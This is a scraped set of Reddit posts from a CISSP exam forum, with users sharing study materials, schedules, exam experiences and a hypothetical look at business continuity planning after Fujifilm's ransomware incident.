Short and well-produced. They do a good job of summarizing topics within each domain and provide an organized view of the material. It’s a good source for a quick overview of each Domain or as a last minute review.



Text Materials:

- Eleventh Hour CISSP Study Guide [Free with O'Reilly]
Good for an overall introduction to CISSP topics. Some of the topics are dated, so keep that in mind if you use this for review.
 
- (ISC)2 CISSP Certified Information Systems Security Professional Official Study Guide 8th Edition [$40]

- “Sunflower” CISSP Summary Version 2.0 [Free]
Wasn't a fan of this, but I did use it as a final review.
 

Practice Exams:

-(ISC)2 CISSP Official Study Guide, 8e [Free if you buy the book]

- CISSP Official (ISC)2 Practice Tests [Free with O'Reilly account]


Misc:

- Why you WILL pass the CISSP – Kelly Handerhan via YouTube
Great job of covering the mindset you need to pass the exam.

- Essential CISSP Exam Guide: 2018 CBK [$14.99] – Audible (17 hours)
The audio quality is not the best, but I found this to be useful when I didn’t have time to sit down and study.

 

My Study Schedule:

I studied over a 3 month period. The first month was largely spent easing into an overview of each domain and trying to establish foundational knowledge to build upon later. During the first month I totaled 62 hours of study, a little over 2 hours per day. The second month was focused on diving deeper into the material, powering through multiple video courses, and taking a couple practice exams to determine where I stood. During the second month I increased my total study hours for the month to 82, averaging approx. 2 hours and 40 minutes per day. I spent the final month reading the official study guide and taking practice exams (I answered approx. 1,500 questions during this period). Overall, I spent 110 hours studying in this final month, averaging a little over 4 hours per day. I increased my study efforts during the final week before the exam, studying 36 hours during the final 7 days. All of this time was spent reviewing and not trying to learn new material.

 

Recap:

Month 1: 62 hours (2 hrs/day) - Intro to each domain
Month 2: 82 hours (2.5 hrs/day) - Deep dives
Month 3: 110 hours (4 hrs/day) - Practice Exams and reviews
 

Final Thoughts:

1. Develop a plan early and stick to it. Use some of the shorter study items to identify your strong and weak domains. Build your study plan around these results.

2. Don’t try to become an expert in your weak domains. Put in the time to become proficient, but don’t ignore the other domains.

3. Learn the logical processes as opposed to memorizing exact steps. Understand how everything fits together instead of memorizing definitions.

4. Remember to approach the test with the appropriate mindset.

5. Practice tests are important to identify knowledge gaps, but don’t try to memorize the answers. Read the explanations and try to understand why each answer is the correct choice.

6. Take a few breaks from studying where you don’t review any CISSP material for a day or two. Especially the day before the exam.

 

TLDR: There is a lot of free material available to those with a DoD email account. Set a goal and stick to it. Take some breaks and find time to relax and have some fun. Spend time reviewing questions on the exam and approach the test with the appropriate mindset. When you get close to your exam date, trust that you've done enough to prepare yourself and take a break the day before. Best of luck!",2021-07-08

3283,of9geh,Fujifilm Ransomware BCP/DRP CISSP Correlation,"Greetings, I wish everyone good luck on their CISSP exam this week.  With all the ransomware news, I was especially impressed with the way Fujifilm handled their ransomware incident.  They didn't pay the ransom and recovered operations from backup.  Just thought I'd share some notes of what I thought Fujifilm's BCP/DRP process may have looked like if it helps to correlate the real-life event to your CISSP studies.  Everything below is hypothetical and just used as an example to apply CISSP concepts to real life.  These are just guesses.  

BCP/DRP Process (General) Steps

  **Step 1** **is defining a policy, narrowing down the scope, and beginning the initiation of the BCP/DRP**

*  For Fujifilm, their senior management probably did have a clear policy and scope defined.  
* We can tell they had a policy and scope because when the article I was reading on the publication “Verdict”, asked the company if they had sufficient backups, their response was “Fujifilm does have **backups** in place as a part of its **normal operations procedure** aligned with its **policy**”.
* If Fujifilm had a policy about normal operations procedures after a disaster, it means they definitely had a policy to have a BCP/DRP plan in the first place, because as we know, nothing gets done in a company without first having a policy from senior management.
* Because Fujifilm had a policy to have a BCP/DRP plan in the first place, it attributed to their successful recovery of operations. 
* Otherwise, if there was no policy or a BCP/DRP plan, things would not have gone as smoothly.
* During the ransomware attack nobody would know what to do, what direction to go, how to handle the situation…nothing.  It takes a policy from management to create the BCP/DRP plan, which will provide the pathway to how to handle a disaster.  

  **Step 2 Business Impact Analysis - Define the critical business functions and resources**

* Fujifilm's Chief of Operations could state that if the data on those servers were being held for ransom, the business would come to a standstill, and the data would be needed back in order to continue operations. 
* The Director of Network Operations could say that if their Content Delivery Network solution were to stop working, that would stop the organization’s e-commerce business process, and would result in a heavy loss of revenue.  
* Both provided a technical issue, but also stated how it would affect the overall revenue-generating process of the company (both technical and high-level reasons)

  **Step 3** **- Contingency Strategies (Decide the most cost-effective and reasonable recovery strategy)**

* According to FIPS 199 an impact level of ""High"" would mean any damage or disruption to assets with this rating could halt everything in the business, the organization, the objectives, the networks, systems, applications
* Suggested backup is real-time replication of data as well as WAN/VLAN replication
* Suggested recovery strategy is a hot site

  **Step 4 - Testing and Maintenance** 

* Out of all the tests, maybe they most likely did a parallel test
* Businesses are hesitant about a full-interruption test as it means to stop the business
* If it was a structured walkthrough then individuals who head their own respective departments come together and discuss responsibilities
* If they did a simulation test, they would have all their BCP coordinators, BCP team, network engineers or their bosses, or other operational and mid-level management there to participate.  
   * Meaning, it’s just a simulation, but you have to act like it's happening.  Fujifilm probably checked to make sure their backups were processing, and ran through some things to see if the backups could be retrieved, without actually fully recovering them.  
   * They just simulated not only the disaster, but also the response, nothing “actually” was done like in a parallel test.  
* And of course, as with all CISSP processes, make sure there is documentation  
* Also updating the BCP/DRP document in case of any of these changes: 
   * Major changes to the company’s network or system architecture 
   * Changes to senior management
   * The addition or removal of certain technology
* Documentation and updating changes to the BCP/DRP document is all part of ""maintenance""

I thought it was neat how Fujifilm didn't pay the ransom and initiated a successful BCP/DRP.

Have a solid week ahead.",2021-07-07
3284,of0f0r,Passed today. Everything they say is true...,"I passed today with 100 questions in about 80 minutes. All of my questions were from left field. It's like the test writers said ""okay, you read the Sybex Guide? Good, so you know the terminology. But since you have 5+ years of security experience, you should know how to solve this hypothetical problem that's tangentially based on the this risk management principle..."" 

It's like it doesn't test you on your knowledge of the material, but rather on your ability to internalize a and articulate the principles in scenarios you've never contemplated. 

Or what's more -- it's like you're going to an oracle and telling her you're worthy of CISSP. You act like you're worthy, but the whole time, deep down, you question if you're really worthy (i.e. you expect to see FAIL at the end). In then end the oracle is never wrong. Now I just have to wait until my psychometric evaluation is complete to see if I can get past my provisional pass. Hopefully I'm worthy. 

Study materials (in no order):

1) Sybex book

2) Mike Chapple LinkedIn Learning (All Domains)

3) Thor Teaches (Domain 1 and 2)

4) Wiley Sybex App quizzes

5) Self-paced Online course from uCertify (paid for by my employer). This has quizzes and labs. 

It's hard to say which one was the best. But the uCertify course was long and I has to finish it all to get a test voucher, so it certainly had the biggest impact on me. 

Good luck to you all!",2021-07-06

3286,oexlqz,Cue the panic - 5 days until exam date,"Like many, I've just been lurking here, reading nearly every success and horror story. I'm five days out from exam time and the panic is starting to set in. I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. 

I've been studying off and on for a little over a year, four consecutive months of intense study, and have been utilizing the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I've also taken a 10-week  bootcamp class three times (seems excessive now that I'm writing that out!). The OSG was a last minute add but it's been helpful to switch things up a bit; I'd found I was getting too used to Boson's question formatting. 

I'm scoring 75-80% in Boson and the OSG test banks. Around the same in PocketPrep. I've answered thousands of practice questions and made thousands of flashcards. This week I'm trying not to panic-cram but instead focus on really honing in on the BCP, DRP, SDLC and incident response phases/processes. Also Kerberos because those terms are tricky AF. Domain 4 will always be my weakest domain since I had no idea what a packet was and had never heard of the OSI model before starting to study for the CISSP (true story). While I know the basics, I've resigned to the fact I'll never remember what every single protocol does. I'm hoping that my lack of technical background will help me think less like a problem-solver and more like a manager since that's really all I know. 

I've scheduled (and rescheduled) the exam 3 times but this time I'm going for it. My brain is cooked; even if I had another month before the exam, I don't know that I could retain anything additional. Anything you'd recommend for the last couple days before the exam (besides more panic)?",2021-07-06

3288,oene2u,How to pass CISSP with limited budget,"Hi I provisionally passed at 100Q (30 minutes before time) on my 1st attempt. I prepared a long time since if I fail I couldn't retake it for at least a year because its too expensive (I saved money for this exam for almost two years and borrowed money from payday loans for some of the study materials) so failure wasnt an option.

My background:  
Im from a 3rd world country (Poland), Im working as a senior cybersecurity consultant for 6 years. Before that, I've been a Java/Scala developer for 8 years but I decided to go for cybersecurity since there are way too many software developers in my country and the wages were getting lower and lower due to high supply.  I was also always very interested in cybersecurity issues. Besides that, Im programming since I was about 13 and created several open source projects.

Materials used:  
\- All in One Exam Guide 8th edition - this was my primary resource for about 5 months since it was given to me (along with OSG and Think Like a Manager Book) by my colleague who also tried to take CISSP but he given up. I read the entire book very carefully but didnt take much notes. I scored about 80% in the tests. It was very boring and given too much details (history etc), I liked the OSG dry style much better;  
\- OSG 8th edition + practice tests - another resource given to me, I read chapters about domains 1, 3 and 5 since they were relatively unchanged compared to new 2021 exam (according to Mike Chapple comments) for about one month; this time I did many notes; in tests I scored about 85-90%;  
\- How To Think Like A Manager for the CISSP Exam - tiny book so I read it very quickly, pretty good resource;  
\- Mike Chapple videos on Linkedin - FREE for first month and updated for 2021 material so I watched them all during that first free month and did a lot of notes. Mike Chapple said that combining his videos with 8th edition OSG should be enough to prepare for 2021 exam;  
\- Official ISC2 flash cards - FREE, good to learn some definitions, minor mistakes;  
\- OSG 9th edition - one of two resources I bought, read chapters about domains 2, 4, 6, 7, 8 which changed most using speed reading (I got the book about 2 weeks before the exam). Vitalsource Bookshelf app is crap but I've had to use it since my account on amazon was blocked due to failed payments. Registered on Wiley  online learning and took all the tests, scored about 85-90 so same as for OSG 8th - questions vere much easier than those on the exam;  
\- CISSP Mindset Academy - scored 64% on both; few major errors but decent explanations for questions, questions vere more similar to those on the exam;  
\- [CISSPREP.net](https://CISSPREP.net) \- did only the free initial test and scored 80% (15 out of 19), couldnt use full version due to high cost (25$ - beyond my budget);  
\- Watched several youtube videos including Why you will pass the CISSP and How to Pass the 2018 CISSP exam: A Sure Fire Method to Help You Ace the Exam. Tried to watch also Destination Certification videos but I learned about this resource late in the study so I prefered my own already made mind maps to theirs;

Materials did not used:  
\- BOSON - I wanted to give it a try but it was way beyond my budget even with 25% discount and also not updated for 2021 so I decided to pass and use wiley as my primary test bank;  
\- Thor Teaches - ultra expensive also.

The exam:  
\- The questions were rather hard, some of them covered subjects I did not encounter before so I used elimination and reasoning technoques. I read questions and answers very slowly so at question 100 I was left with only 30min - if the test would keep going to question 150 I would be in a big trouble but thankfully it didnt.  
Im not a reddit user but reading this reddit helped me much with my preparations so I decided to share my experience :)",2021-07-06

Good day!


Well not so good for me as I failed the exam after answering 150 questions in 1 hr and 45 mins.


I was thrown with a lot of questions in a certain topic in which I didn't dive that deep. When I checked the OSG, that topic is just discussed in one page and showed additonal links for further reading.


I tried to apply the ""Risk Advisor"" mindset during the exam. I would say I used it properly as I was able to determine which is the correct ""Managerial"" answer from the correct ""Technical"" answer which is focused on fixing things.


For my study plan, I've used OSG, Cybrary, Boson, CISSPrep, and Rob's MindMap for like over 6 months of studying.


I have 7 years of experience under my belt in IT (Telco, NW, Security Engineering) and currently working as InfoSec Consultant.


I am now thinking whether should I retake the exam. If so, I am considering to take it after 6 months or even couple of years. I think this exam is easier for folks who are more seasoned in the industry.


For those who are studying for the exam, don't stress yourself too much. Remember to take a break during your studies as this exam will surely bring a study fatigue.


Have a nice day!",2021-07-02

3308,ob3mpw,Provisionally Passed 21 June 2021!!!,"150 questions in about 2 hours.  I made my first attempt about 4 years ago. On February 2021 I decided to give it another try. I booked the test to make sure I had a deadline. I studied a lot during my free time. I never felt prepared for this beast. I made sure that I truly understood the material and wasn’t just memorizing things. This helped me A LOT during the exam. I felt confident in maybe three of my answers. I read the question several times, read the answers, then read the question again. English is not my first language and I sometimes have a hard time figuring out what they are asking. I honestly thought I had failed. I didn’t look at the paper until I was outside the building. I almost cried when I read “Congratulations….” on the paper. I am honestly still in disbelief that I passed but I feel like a massive weight has been lifted. 

Study Materials:

I started with Kelly Handerhan’s CISSP Cybrary.it videos. They are amazing! She helped me focus my studies. 

Used OSG 8th edition as a reference book. I did read the end of chapter summaries. 

Rob Witcher’s Mindmap videos on YouTube were AMAZING!!!! 

I read the 11th Hour a week before my exam date to refresh my mind.

I did a lot of practice tests on the Wiley test engine that you can gain access with the OSG book. 

Thanks to this REDDIT community, I found CISSPREP.net. The questions were HARD but they helped me a lot. I have to agree that the way they ask the questions is probably the closest to the format of the exam. 

IT & Security App- I took quizzes whenever I was sitting around. 

I truly want to thank this community. I would find encouragement from everyone's posts, pass or fail. 

Experience:

I have about 14 years of experience in various roles as a SOC analyst, RMF roles, and engineering roles.

Busy studying using the 8th edition and recently on a study group someone said that there is about 200+ pages of new content in the 9th edition. My question is will I be able to continue on the 8th edition and then just watch videos on the new content because I can’t afford to purchase the ninth edition now. 

You may ask why I didn’t wait for the ninth edition is because in my country (south africa) resellers told me that they would only have stock by middle August and I would hopefully have written the exam by then.

Thank you.",2021-06-30
3311,oakjg4,Provisionally passed @ 107Q in ~130 minutes,"This was the 9th time I have sat for a certification exam in my IT career and I probably studied three times more than I did for any of the other ones - MCSE, A+, Security+. I have around 25 years of experience in the field, most of that as a network admin on Active Directory/Azure. But I've also worked the helpdesk, been Tier 2 and Tier 3 support, and even spent a year as a Logistics Manager, which I was surprised to find got me a lot of experience with the physical security concepts that were on the exam. 

I had actually planned to get my CISSP in 2020, back to back with getting my Security+, but two things happened right when I was about a month or so out from being ready for the exam, I got a new job, and then there was a global pandemic that shut all the testing centers down, so getting the CISSP went up on the shelf, but I did do about 4 hours of training a month on it, which is nowhere near enough but it kept me in the mindset.

Anyhow I got laid off this spring so I decided to go ahead and wrap up the CISSP certification while I have a lot of time to study for it. One thing that really got me into high gear was to go ahead and schedule the exam, once that clock is ticking down, even if it's weeks away, it will keep you motivated! I did find that it was hard to get available spots 1-2 months out for the exam, but if you keep checking the available spots you find that many candidates reschedule their exam when they're about 2-3 weeks out. So when I felt like I was about 3 weeks away from being able to do it I pulled the trigger on the 29th.

Study materials:

* **Original Study Guide (8th ed.) and Original Practice Tests** \- I got the bundle off of Amazon last year when I started studying the first time. I did wind up reading the OSG cover to cover in 5 days but it was towards the end of my studies. It's a tough read but I pushed my way through, and now I think that doing this was critical to understanding the material for the exam. It tied up a lot of small loose ends that I had been struggling on. I strongly suggest reading all of it at least once.  As for the OPTs I registered those online through Wiley Efficient Learning, and downloaded the ios app so I could take the tests on my PC and on my iPhone. I will say the web based version is kind of clunky and I wound up needing to login two or three times to get it to work but it was fine once I got logged in. The ios version seems to be better. The nice thing is that both the web version and the ios version share your results so you can check your progress from either platform.  One thing I didn't realize until late in the game was that if you register the OSG online as well it gives you a completely different test bank of 1300 questions, so be sure to register both products if you get the bundle!
* **Boson CISSP Practice Exam** \- I actually bought this last year as well but I had only taken the first of the five practice exams in it. Yes it's quite technical but just like the question banks from the OSG and OPT, it's testing you on the knowledge base you'll need to pass the real exam. No, the questions aren't like what you'll get on the exam but you must have a complete understanding of all 8 domains and that's what this product is testing you on. The explanations are excellent and will point out where you need to study more. Also at the end of the test it will show you what domains you may be weak on. 
* **My strategy for taking practice tests** \- I'd like to point this out because I think it's important - the CISSP exam is not like other technical certifications you may have done before. Taking practice exams over and over again until you've memorized all the questions and answers is not going to work. My study strategy for the practice tests evolved over time but the way I decided to do it was that instead of taking the same practice exams over and over again I would take them once, then go back and re-take all the questions I answered incorrectly. If I could answer one of the questions correctly then I was done with it and closed those questions out. Fortunately both Boson and Wiley Efficient Learning let you select only the questions you've answered incorrectly for creating custom quizzes so that's where I focused my studies. I did wind up taking the Boson tests twice, about three weeks apart, but out of the 10 practice tests on Wiley Efficient Learning I only took those once. 
* **MFProd on YouTube** \- I did these as part of my study last year before the pandemic hit. If I remember right it was more than 40 hours of material, and was very comprehensive. Unfortunately last year there was some kind of copyright issue with these and they were taken down. A shame, because I made my own ""boot camp"" out of it and took pages and pages of notes which I was referring to as recently as last night.
* **CISSP Cert Prep (2021) on Linkedin Learning** \- since MFProd was gone I needed to use something else, and I had used Mike Chapple's Security+ course on Linkedin to pass that exam so this was the first place I went. Fortunately I discovered that I could get access to LinkedIn Learning for free with my local library card! So I signed up for a library card and then got access to the LIL site. It's more or less the video version of the OSG so it's a bit dry and was kind of a grind but I watched all of it and got myself back up to speed.
* **Kelly Handerhan videos on Cybary** \- everyone talks about watching these and there's a good reason why - Kelly is uniquely skilled in explaining some of the harder to understand concepts you'll need to understand for the exam. After watching this I had Kerberos down solid. It's not like the LinkedIn Learning course in that it's much shorter and not as comprehensive so this is something you should watch towards the tail end of your studies, I was most of the way through this when I scheduled my exam time 3 weeks away.
* **CISSP MindMaps on YouTube** \- these are pretty good, when I was weak on a domain in the practice tests I would go back and watch the MindMap videos for the domain I needed to brush up on. 
* [**CISSPrep.net**](https://CISSPrep.net) **practice exams** \- this was the first of the HARD practice tests that I purchased. Some of the questions are a little rough around the edges but they're quite difficult and they have a LOT of practice tests. The exams are only 50 questions but they're hard, and it will take you a while to get through them. I only did about 5 of these in the end but the explanations are good and once I was done with Boson and WEL, these got me ready for what the real exam would be like.
* **CISSP Mindset Academy practice exams** \- these are also HARD questions and they've been updated for the new material on the 2021 exam. I took both exams just last week and was only able to score in the 50% range on them, that was a bit worrying to me until I found out that's a completely normal score for someone who is about ready for the exam. Once again, I would do these after you've already completed Boson and WEL- these get you ready for the real thing. These tests and the next one are both on Udemy. 
* **HARD CISSP practice questions #1 Thor Pedersen** \- for me this wound up being the final go/no-go for sitting the real exam. I decided that if I was under 50% the first time I took it I was not ready and would have to re-schedule the exam. I scored 55% when I took it last Sunday. I decided I was ready to go. Thor is the guy who says you should do 5000 practice questions before going for the exam, and I tend to agree with this. I'm not sure if I did 5000 questions but I'm pretty sure I was over 4000.
* **Eleventh Hour CISSP Study Guide** \- I got the audiobook version of this and listened to it all the way through on the very last day at 1.3x. Finished it right before I went to sleep on the last night before the exam.
* **Why You WILL Pass the CISSP Kelly Handerhan, Larry Greenblatt CISSP 2020 Exam Tips, The CISSP Mindset: How to ""Think like a Manager"" and PASS!**  \- watched these three videos right towards the end. Heck, the last one I watched in the parking lot of the testing center. These put you in the right manager/advisor mindset to take the real exam. Want to know why a lot of people fail the exam on the first try? They didn't have the manager/advisor mindset going into the exam, that's why.

So as others will tell you the questions you get on the practice exams aren't like what you'll see on the real exam and this is quite true, especially for the WEL and Boson stuff. The hard exams I listed are closer to the real thing though. 

Like everyone tells you, I wasn't sure if I had passed or not when the test ended. When I got to question 101 I knew it was really serious at that point, and by then time management was becoming an issue. Definitely read every question on the exam more than once! There were a couple of times when I looked at the answers and thought ""all of these are right answers"" and then I would find a single word in the question that made only of the answers the correct one. Those were the ""A-HA! GOT YOU!"" moments. (imagine the gif with Leonardo DiCaprio pointing at a tv screen here). There were also a couple of ""What the heck are they even trying to ask me?"" moments. I gasped when the test suddenly ended at question 107 and wasn't 100% certain how I had done until I opened the printout the lady at the front desk handed to me. I actually had to check that exam sheet a couple of times just to be absolutely certain I hadn't hallucinated the words ""Congratulations!"" and ""you have provisionally passed"".

By the way both this subreddit and the Certification Station discord server were critical in getting me that passing score. I was checking posts in here every single day and hanging out in the # cissp room on the discord server. 

Thanks everybody and if you have any questions I'll be happy to answer them.",2021-06-30

What worked for me:

* Mike Chapple LinkedIn videos
* Sybex practice tests and the Wiley efficient learning app - This is a great platform!
* Destination Certification CISSP Mind Map on Youtube - This guy does a wonderful job of summarizing and explaining key points in each domain. I think they compliment Chapple's videos really well. I would watch Chapple's videos, do some practice questions after the domain, and then watch the mind map video and then do some more practice questions. 
* Why you will pass the CISSP youtube video by Kelly Handerhan - this is a quick one and I watched it at the parking lot of the testing center, as a final pep talk before heading in.  

What didn't work:

* 11th Hour - so general I fell asleep
* [cisspprep.net](https://cisspprep.net) \- I picked it up on here and some of the reviews were great so I gave it a try... the website is somewhat confusing and while I got some good tips I felt like I was mostly looking to understand the author's intent in the question and what they wanted me to select than the actual info that's relevant for the exam

About me:

I have over 15 years of IT experience. I've been on the engineering side, the IT side, and now I work for a security vendor and talk security to CISO/CIO, architects, engineers and a LOT of the material for the exam was driving me nuts because it was just wrong. I knew what was expected of me to answer and so I did just that while grinding my teeth.

Every job posting says that CISSP is either preferred or required so I’ve been looking into it and took a couple of pre-assessment tests and made 70’s on both of them. The task still feels daunting because I’ll see people post here with 10-20 years of IT and InfoSec experience and *still* feel like the test was difficult.

3315,oa36sd,Provisionally passed 29th June 2021,"I had provisionally passed the CISSP exam this morning. It ended at 100 questions around 135 mins mark. 

I scheduled the exam date in April just before the price hike, and I almost exclusively only used Luke Ahmed's Study Notes and Theory practice tests to prepare during the past 2 months.

I had practiced with questions A until 1A one time each, and only used 1 set of practice exam from Boson to check if I was able to complete 150 questions within 3 hours. Overall I think I had reviewed around 1000 questions.

My average score varies between 60+ to 70+, but after taking Luke's hard questions, the real exam questions feel simpler, but not easy by any means.

Though I didn't read any prep books besides reviewing the practice tests, I do have 10+ years of experience in the field which I relied upon heavily. Using similar strategy, I had passed CISM exam in March this year after 2 weeks practising the QAE.

On the last day before the exam, I had also watched some of the Destination Certification CISSP videos on Youtube and I found them to be very helpful in solidifying the concepts. I wish I had watched all of them earlier!

I didn't follow any strict study plans, just practiced the questions whenever I can; on the bus, after work while listening to the news, while tending to the baby crying, while accompanying my wife watching Netflix, and even during toilet time lol! I'm fortunate that my wife is very understanding to tolerate my 3AM sleep schedules.

I had seriously considered to reschedule the exam date to have more time to prepare, but I'm really glad that I believe in myself and go ahead anyways. Extremely relieved that it's over now!

3316,oa20k3,Passed CISSP first attempt (4 week study),"A little background - I’ve been in the industry for 20 years and have a degree in IT (Network Management and Infrastructure).  I work for a company doing cyber security software integration, testing, and support. Much of what I do is more in the CEH realm and I have a broad background that includes management so all of this certainly helped.  I also own a Technology consulting and support company providing cloud solutions, network architect/implementation services etc.

The company I work for won a contract that requires CISSP certified personnel and I was tasked with getting certified with about 30 days notice.  To their credit, they paid for a one week CED Solutions boot camp and gave me an additional week off (paid) to prepare before the exam.   I didn’t want to let them down so I studied like crazy. If I wasn’t on my computer taking ‘cccure’ practice tests, I was on my phone doing practice quizzes from ‘Pocket Prep.’  If I was driving, I was listening to ‘Mind Map’ and ‘Inside Cloud and Security’ YouTube videos.  

The test is no joke! I felt unprepared going in and throughout the test, I was never confident enough to put money on a passing score. I think this is normal and I knew I was answering more correctly than not. So relieved that I can continue my life and enjoy the summer! I would say the biggest help for me was going through practice exams and thoroughly reading explanations for every answer.  I already knew things like the OSI model, common port numbers, PKI etc. but I still reviewed every explanation as I went through practice questions.  My attitude going in was, I’m not gonna stress over a fail. I planned to study harder and attempt again in 30 days. It didn’t help that my family, coworkers and friends knew I was studying and all wished me luck… that just added pressure I didn’t need. Or maybe I did need the pressure. I’m just glad I passed.

IMO Requiring bio-metrics such as hand-prints or for verification during assessments is not appropriate, both because it's a collection of private information but also because it's not in-line with the security requirement of the exam. I think CISSP needs to reevaluate this option. This is a complete invasion of privacy and not appropriate, make worse so by the fact that NO actual information is provided relating to restrictions or retention on the bio-metrics collected, this is in complete contradiction to the intended content within the damn exam!

3318,oa0x4s,I passed CISSP on my second attempt. Lessons learned,"I finished the exam about four hours ago after a second attempt from a year ago and here’s what I learned. Tl;dr. “Have a plan, Attack!” > “Have a plan: Attack!”

My background: I’ve been working in security for about five years with a background in IT for about 20 years from desktop support to senior engineer/sysadmin roles. Up until today I had one recently expired ITILv3 Foundations and one expired Security+ certification. For each attempt I did about three months of studying.

1. What did I use to study?
The CISSP Official Study guide
The CISSP Official Practice tests (book)
The CISSP study test and exams mobile apps
11th Hour CISSP
Serious Cryptography (not on the exam but a good book for later to explain that stuff)
Cybrary (all respect to Kelly Handerhan but I only made it through the first two domains)
The Shon Harris book (all respect as well but I probably cracked it open twice during my first attempt and that’s it)
YouTube 
    CISSP Exam Cram Playlist (Inside Cloud Security)
    CISSP Mind Maps (Certification Destination)

2. How did I prep and why did I fail the first time?
I gave myself about three months of study time. I used the mobile app and took practice tests in small bursts (10-20 a day). Minimum of 70% on each of the domains
I planned it out three months in advance but didn’t have a plan other than taking the practice tests over and over. I made it a point to mark and highlight the official book (more like small post it notes but had not dived into the book as much. Two weeks before I skimmed through the 11th hr book writing down notes on paper, one domain per page. Admittedly I didn’t have a plan and wanted to get back to grinding towards OSCP. I also thought about the questions as an engineer and not a manager. I was also in a sour mood about it after reading a few job/certification threads on Twitter. Probably anecdotal but who knows. 

3. What I did this time?
So I mentioned OSCP earlier….I’ve put a lot of effort toward it but in between failing and peer pressure from work (something something jump off a cliff and get a CISSP because your coworkers did). Basically the Friday after failing my OSCP….again, I said @#$& it, I’ll just sign up for the exam and knock this out.

The first thing I did was plan out the next three months of how I was going to study.
The whole three months: listen to the aforementioned YouTube playlists over and over. Even in the background while playing video games or while I would go on walks. I not only wrote out a plan but also joined this subreddit and read a bunch of the passed/failed stories and used some of the least common denominators 

March-April: Finish ALL the practice test questions in the book, graded myself on each domain, and took notes for questions I was clueless on I.e. questions I couldn’t find a wrong answer to.
April-May: I used the mobile app (the official one) again, this time taking the tests in larger chunks (50 questions). Sometimes I would do all the domains, or sometimes a couple. No rhyme or reason, just more exposure and taking note of where I needed to study.
May-June: I wanted to get 100% finished with any of the domains on the app but did at least get a minimum of 70% on all the domains. I took notes from 11th hr again except this time I ignored stuff I was already familiar with. 

A week before and during the exam: In addition to all the other notes I wrote down a few notes for things I was still stuck on (formulas, key lengths, etc), but got some good advice from my boss for the exam on eliminating wrong answers: Use the laminated paper you get for the exam to write A,B,C,D and for each question, put an x next to each possible wrong answer. I also wrote down the formulas and other things I made a point to memorize on the exam. Did I run into a lot of those questions? I honestly couldn’t tell you, but I didn’t want it to be a concern. Aside from that I wrote at the top of the paper YOU ARE THE CEO! to set the framework.

As for the exam, I was feeling confident up until about the last thirty questions and was getting that sinking feeling I wasn’t gonna pass but had already made my mind up and planned out what I was gonna do after so to be honest even after passing I walked out the building saying “@##& this exam” to myself. It has to be the first time I was pissed about something positive I did. 

Anyway, aside from planning things out I wanted to give a shout-out to this subreddit for the stories shared. One thing that can be a double edged sword is seeing all the celebratory posts on passing it. 

Work wise it was also much easier to plan and focus when I would see really smart people exercise the knowledge and not treat it like a “checkbox” cert. I loathe the idea of learning out of arbitrary “obligation”.",2021-06-29

I want to thank everyone here for sharing their experiences and insights as it relates to preparation and more.

I took the exam back in 2016 and failed.. I had taken a boot camp and thought I was ready, but I wasn’t and I didn’t have the right mindset going in. Of course I took the test in the old format so I mentally prepared myself for the new style this go round.

In terms of study….
-I read CISSP for dummies back in September and started flagging areas I needed to do further research on to understand. I identified a study plan and then I tried to stick to that. I wasn’t as strict as I could’ve been during the holidays and beginning of the year, so I had to really buckle down the last month and a half/two months before the exam.

-sunflower: it was okay I mean I read a few times but it just wasn’t for me. Maybe the way the information was setup just couldn’t work for my thought process. But still good to glance at.

-Sybex book: I tried to read cover to cover but it was hard to get through after a while I started using it as reference for things I couldn’t grasp. I did do the practice questions too.

-BOSON: you can’t skip this. While the questions are overly technical they help reinforce and identify what you are weak on. Do each test once and that’s it. If you keep doing them repeatedly you won’t learn anything. Just use them to get a sense of where you are and make adjustments to your study plan accordingly.

-Thor’s courses on Udemy I listed to the audio of the videos to and from work for the last 6 weeks. I took the practice tests at the end of each chapter and at the end of each course.

-CISSP ALL IN ONE  by SHON HARRIS.. I loved this book. Absolutely loved this book because I felt it was easier to read just overall easier to digest. I did practice questions at the ends of each chapter and also read the bullet lists of quick tips at the end to refresh myself the day before the exam. 

-Thor’s hard questions. I purchased them as soon as they were released and took all four. Understand that these are really hard and you will likely score lower here than you have on other practice questions. I will admit I scored horribly but realized there were a few things I was getting confused on and that I really need to take time and review some areas I assumed I just knew because they were directly related to my day to day job. I reviewed them and even found diagrams online to help me better understand. I’m more of a visual person so after a while the text is just gibberish to me. Pictures help a hell of a lot.

-this leads me to cheat sheets. I found Comparitech’s sheets online and found them easier than sunflower to digest. Granted printing some of the domains did the cheat sheets no justice because it was too small to read. I have a large tv screen to view things so for me it was better to read digitally. 

-Kelly Handerhan’s Why You Will Pass the CISSP 10 minute video. I read it before I began my study plan and again this morning before the test. Let me tell you, she reinforces the mindset and encourages you to find that confidence from within to really tackle this exam and come out a winner.

The main thing I would say is find a way that works for you. Books, pictures, video, audio.. whatever. At the end of the day you can do it.. you can pass! Just give yourself time.",2021-06-29
3320,o9wzlc,I PASSED CISSP on 2nd TIME!!!,"So, I stumbled upon this group late in my CISSP studies, probably a couple of days ago to be honest.  I had already scheduled the test and only had a few days from discovering this subreddit before I took it.  Even with that short amount of time, some of the resources on this subreddit were extremely helpful!

I took the CISSP exam this morning at 0800, and after around 110 min and 150 questions...I GOT THE GREAT NEWS THAT I PASSED!  I just really wanted to share this with everyone as I am so ecstatic over this accomplishment!

In case anyone wants to know, below are the study materials that I used.

* I attended a boot camp through Infosec Institute.  Was extremely helpful and they also have a pass guarantee where if you do well in the class but do not do well on the test, you can retake the bootcamp and test without extra charges. 10/10
* Boson Ex-Sim Max - EXTREMELY helpful with explaining why things were the way that they were.  Unfortunately, I remember questions well, so after taking multiple tests through the Boson software I was recognizing questions, but still, would recommend 8/10.
* Wiley Test Bank - Basically the same as Boson, not as informative as to why answers were the right answers, but has a huge test bank and I did not see many questions multiple times. 7/10
* Eleventh Hour - I really enjoyed the summarization that this book used to explain different concepts throughout the Sybex text.  I read it twice through leading up to the test. 8/10
* CISSP Sunflower Summary - A couple days before the test, I read this all the way through while also taking practice tests for each domain as I read through them.  A very good summary of information, but don't use as your ONLY study guide. 6/10
* The CISSP Mindmap Videos by Rob Witcher - Extremely helpful and nice to listen to while I was driving in the car.  A lot of information crammed into short videos, but still helped me solidify some information. 7/10
* Kelly Handerhan Why you will pass the CISSP - CAN'T STRESS THIS ENOUGH, this video was extremely helpful on understand what mindset to have when you are going to take the test.  I listened to this at LEAST 4 times leading up to the test.  Don't think I would have passed without it. 10/10

